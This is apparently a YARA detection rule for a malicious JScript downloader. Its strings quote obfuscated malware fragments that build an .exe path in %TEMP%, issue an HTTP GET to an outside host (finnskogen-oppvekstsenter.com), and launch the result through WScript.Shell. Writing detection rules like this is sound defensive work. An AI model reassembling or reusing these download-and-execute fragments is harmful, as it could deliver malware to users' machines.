rule sig_20160328_64d9ca8b972a616cb1c2925832d470cc {
  meta:
    description = "datamaliciousorder - file 20160328_64d9ca8b972a616cb1c2925832d470cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "70dba67c68c1c3ea4c5a6c7ede6ddfd6e743a07a36dd49b70a78ff21e0d38789"

  strings:
    $s1  = "function Krlvyqitd() {return Iypwtmh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"qWneSRIAVv4.exe\";};" fullword ascii
    $s2  = "Kmyaebn[Kzzhkl](\"GET\", \"http://finnskogen-oppvekstsenter.com/o4paka\", false);" fullword ascii
    $s3  = "do {WScript[Ynktptjb](Weceuzvwoo() * 11)} while (Kmyaebn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xqrmiymz(Uaasozya, Grtiy){return Uaasozya - Grtiy;};" fullword ascii
    $s5  = "var Iypwtmh = function Xfmejmx() {return WScript[Ahaecm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zsgvnzvbsi(Yvwrgzq){Iypwtmh[\"Run\"](Yvwrgzq, Gpvcqvub, Gpvcqvub);};" fullword ascii
    $s7  = "function Rrikefluu() {return ((Omtdyjb == true) && (Omtdyjb == Filrntobmt)) ? 1 : Gpvcqvub;};" fullword ascii
    $s8  = "var Omtdyjb = false;" fullword ascii
    $s9  = "function Zejvqvwtje(){return Nkyvhaxv;};" fullword ascii
    $s10 = "var Aoywm = false;" fullword ascii
    $s11 = " while (Xqeyvedti){" fullword ascii
    $s12 = "Omtdyjb = true; " fullword ascii
    $s13 = "function Eplni(){return Ahaecm;};" fullword ascii
    $s14 = "return Xqrmiymz(Ajlpnqfx, Flqxorsfvk);" fullword ascii
    $s15 = "var Filrntobmt = false;" fullword ascii
    $s16 = "function Weceuzvwoo(){return 22;};" fullword ascii
    $s17 = "function Zrdlwcns()" fullword ascii
    $s18 = "var Agocek = new this[\"Date\"]();" fullword ascii
    $s19 = "Filrntobmt = true; " fullword ascii
    $s20 = "function Vqbhu(Csphdqbv) {var Xkwxk = (1, 2, 3, 4, 5, Csphdqbv); return Xkwxk;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}